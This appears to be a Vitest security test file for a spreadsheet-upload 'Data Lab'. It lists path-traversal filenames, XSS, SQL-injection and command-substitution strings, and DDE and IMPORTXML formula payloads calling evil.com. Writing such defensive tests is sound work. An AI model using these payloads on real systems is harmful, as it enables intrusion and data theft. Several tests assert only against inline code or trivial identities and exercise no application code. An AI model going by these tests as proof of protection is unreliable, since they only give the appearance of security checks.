// Data Lab Security Tests
/// <reference types="vitest/globals" />
import { describe, it, expect } from 'vitest';

describe('Data Lab - Security Validation', () => {
  it('should reject path traversal in filenames', () => {
    const maliciousFilenames = [
      '../../../etc/passwd.csv',
      '..\\..\\windows\\system32\\config.csv',
      '%2e%2e%2f../sensitive.csv',
      '/etc/shadow.xlsx',
      'C:\\Windows\\System32\\drivers\\etc\\hosts.csv',
    ];

    for (const filename of maliciousFilenames) {
      // Sanitize: replace any path separators and dots at start/end
      const sanitized = filename
        .replace(/[\/\\:%*?"<>|]/g, '_')  // Remove path separators and invalid chars
        .replace(/^\.+/, '')              // Remove leading dots
        .replace(/\.\./g, '_')           // Replace double dots
        .replace(/[^a-zA-Z0-9._-]/g, '_');

      // Should not contain path separators or relative paths
      expect(sanitized).not.toMatch(/[\/\\]/);
      expect(sanitized).not.toMatch(/^\.\.?/);
      expect(sanitized).not.toMatch(/\.\./);
    }
  });

  it('should validate allowed MIME types', () => {
    const validMimeTypes = [
      'text/csv',
      'application/vnd.ms-excel',
      'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
    ];

    const invalidMimeTypes = [
      'application/x-executable',
      'text/html',
      'application/javascript',
      'image/png',
      'application/octet-stream',
    ];

    // Valid MIME types should pass validation
    for (const mime of validMimeTypes) {
      expect(mime).toMatch(/^text\/csv$|^application\/vnd\.ms-excel$|^application\/vnd\.openxmlformats-officedocument\.spreadsheetml\.sheet$/);
    }

    // Invalid MIME types should fail
    for (const mime of invalidMimeTypes) {
      expect(mime).not.toMatch(/^text\/csv$|^application\/vnd\.ms-excel$|^application\/vnd\.openxmlformats-officedocument\.spreadsheetml\.sheet$/);
    }
  });

  it('should validate file extensions', () => {
    const validExtensions = ['.csv', '.xlsx', '.xls'];
    const invalidExtensions = ['.exe', '.bat', '.cmd', '.sh', '.html', '.js', '.php'];

    for (const ext of validExtensions) {
      expect(ext).toMatch(/\.(csv|xlsx?|xls)$/i);
    }

    for (const ext of invalidExtensions) {
      expect(ext).not.toMatch(/\.(csv|xlsx?|xls)$/i);
    }
  });

  it('should sanitize input parameters', () => {
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      '"; DROP TABLE datasets;--',
      '$(malicious_command)',
    ];

    for (const input of maliciousInputs) {
      // These should be treated as strings, not executable code
      const sanitized = input.replace(/[<>'";$(){}]/g, '');
      expect(sanitized).not.toContain(input);
    }
  });

  it('should handle malformed CSV gracefully', () => {
    const malformedCSVs = [
      '',                           // Empty
      '\n',                         // Just newline
      'a,b,c\n',                    // Headers only
      'a,b,c\nd,e',                 // Missing field
      '"unclosed quote,b',          // Malformed quoting
      'a,b,c\n1,2,3,\n4,5',         // Inconsistent columns
    ];

    // All should be parseable without throwing unhandled exceptions
    for (const csv of malformedCSVs) {
      const lines = csv.split('\n').filter(Boolean);
      expect(lines).toBeDefined();
      // Parser should handle these gracefully
    }
  });

  it('should handle XLSX formula injection safely', () => {
    // Formula injection tests
    const dangerousFormulas = [
      '=cmd|\'/C notepad\'!A0',
      '=EXEC("cmd /c notepad")',
      '=HYPERLINK("http://evil.com")',
      '=IMPORTXML("http://evil.com","//")',
    ];

    // These should be treated as strings, not formulas
    for (const formula of dangerousFormulas) {
      // When stored/imported, should be read as literal text
      expect(formula).toBe(String(formula));
    }
  });

  it('should respect file size limits', () => {
    const maxSize = 10 * 1024 * 1024; // 10MB

    // Acceptable sizes
    expect(1 * 1024 * 1024).toBeLessThan(maxSize);     // 1MB
    expect(5 * 1024 * 1024).toBeLessThan(maxSize);     // 5MB
    expect(9 * 1024 * 1024).toBeLessThan(maxSize);     // 9MB

    // Oversized files
    expect(10 * 1024 * 1024).toBe(maxSize);            // Exactly 10MB - boundary
    expect(11 * 1024 * 1024).toBeGreaterThan(maxSize); // 11MB - should reject
  });
});
